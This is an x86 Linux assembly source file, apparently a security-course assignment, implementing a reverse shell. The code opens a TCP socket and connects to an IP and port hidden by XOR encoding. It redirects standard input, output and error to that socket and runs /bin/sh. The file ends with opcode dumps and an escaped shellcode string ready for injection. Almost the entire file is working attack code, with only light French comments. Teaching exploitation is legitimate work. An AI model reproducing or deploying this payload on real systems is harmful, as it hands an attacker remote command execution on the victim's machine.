; NOM / Prénom : NEHME Ali
; REVERSE SHELL ASM
; M1 - Sécurité - GR3
; ESGI
;


section .text
    global _start


_start:
    ;; Création de la socket


    push 0x12739
    pop ebx

    ; Xored IP
    push 0x01012746 
    pop ecx
    xor ecx, ebx
    push ecx     ; IP  

    ; Xored port + AF_INET
    push 0xbd0a273b 
    pop ecx
    xor ecx, ebx
    push ecx    ; port convertit à partir de "htons" + AF_INET



    push 0x0167
    pop eax     ; socket 

    push 0x02
    pop ebx     ; domaine : AF_INET (IPv4)

    push 0x1
    pop ecx      ; type : SOCK_STREAM (TCP)

    xor edx, edx      ; protocole : The  protocol  specifies  a  particular  protocol to be used with the socket.  Normally only a single protocol exists to support a particular  socket type within a given protocol family, in which case protocol can be specified as 0.
    int 0x80

    ; On conserve la socket dans edi
    push eax
    ; pop edi
    pop ebx


    ;; Connection à la victime + scan des ports
    ;; Permet de se connecter à une socket si trouvé.
    ;; Cette "fonction" permet aussi de scanner à partir 
    ;; du paramètre "TRY_TO_FIND_PORT", une intervalle de port 
    ;; commençant par "PORT_ADDR".
    mov ax, 0x16a  ; connect
    mov ecx, esp    ; Struct sockaddr *addr
    mov dl, 0x10   ; size de sockaddr *addr

    ; socket_fd (socket créé)
    ; push edi
    ; pop ebx  
    int 0x80


    add eax, 0x2
    mov ecx, eax


    ;; Dup2 (duplication)
    not_finish_dup:
    mov al, 0x3f    ; dup2
    ; mov ebx, edi    ; socket de la victime (connexion)
    int 0x80
    dec ecx ; stdin - stdout - stderr
    jns not_finish_dup
    
    inc ecx
    mov edx, ecx


    mov al, 0x0b   ; execv
    ; /bin/sh\0
    push ecx
    push 0x68732f6e ; hs/n
    push 0x69622f2f ; ib//
    lea ebx, [esp]
    int 0x80

    ;; Exit avec un 0 (tout s'est bien passé)
    mov al, 1
    xor ebx, ebx
    int 0x80


;; 66686701586A025B6A01
;; 5931D2CD80505F66B86A
;; 0168392701005B684627
;; 01015931D951683B270A
;; BD5931D95189E1B21057
;; 5BCD8031D289D16A3F5E
;; 89F089FB89D1CD8089F0
;; 41CD8089F041CD805259
;; B00B51686E2F7368682F
;; 2F62698D1C24CD80B001
;; 31DBCD80


;; 66686701586A025B6A01
;; 5931D2CD80505F66B86A
;; 016846270101683B270A
;; BD89E1B210575BCD8031
;; D289D16A3F5E89F089FB
;; 89D1CD8089F041CD8089
;; F041CD805259B00B5168
;; 6E2F7368682F2F62698D
;; 1C24CD80B00131DBCD80



; \x68\x7f\x01\x01\x01\x5e\x66\x68\xd9\x03\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xce